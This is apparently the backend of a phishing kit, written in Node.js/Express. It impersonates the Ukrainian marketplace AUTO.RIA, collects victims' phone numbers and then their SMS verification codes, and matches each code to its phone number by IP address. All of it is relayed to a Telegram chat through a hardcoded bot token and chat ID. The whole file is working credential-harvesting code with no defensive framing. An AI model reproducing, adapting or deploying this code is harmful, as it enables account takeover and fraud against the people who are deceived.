const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const fetch = require('node-fetch');

const app = express();
const port = process.env.PORT || 3000;

// === TELEGRAM ===
const BOT_TOKEN = "8539302594:AAElRKi_77Mm9tCpOyODY3nLs9Z9BzPlp18";
const CHAT_ID = "-5055127448";
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

// Хранилище: последние номера по IP (временная память)
const phoneByIP = new Map(); // IP → номер телефона

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, '/')));

// Екранування для MarkdownV2
const escape = (text) => text.replace(/([_*[\]()~`>#+\-=|{}.!])/g, '\\$1');

// Відправка в Telegram
async function sendToTelegram(message) {
    try {
        const res = await fetch(TELEGRAM_API, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'MarkdownV2'
            })
        });
        return res.ok;
    } catch (err) {
        console.error('Telegram send error:', err);
        return false;
    }
}

// === API ===
app.post('/api/send-data', async (req, res) => {
    const { step, phone, code } = req.body;
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || req.connection.remoteAddress;

    let message = '';

    if (step === 'phone' && phone) {
        // Крок 1: Запоминаем номер
        const clean = phone.replace(/\D/g, '');
        const formatted = clean.startsWith('380') ? `+${clean}` : phone;

        // Сохраняем по IP
        phoneByIP.set(clientIP, formatted);

        message = `
*AUTO\\.RIA*  
*Номер телефона:* \`${escape(formatted)}\`  
*Страна:* Україна
        `.trim();

    } else if (step === 'code' && code) {
        // Крок 2: Показываем код + номер
        const savedPhone = phoneByIP.get(clientIP) || 'невідомий';

        message = `
*SMS\\-код отримано!*  
*Номер:* \`${escape(savedPhone)}\`  
*Код:* \`\`\`
${escape(code)}
\`\`\`
        `.trim();

    } else {
        return res.status(400).json({ success: false });
    }

    const success = await sendToTelegram(message);
    res.json({ success });
});

// Запуск
app.listen(port, () => {
    console.log(`Сервер запущено: http://localhost:${port}`);
});
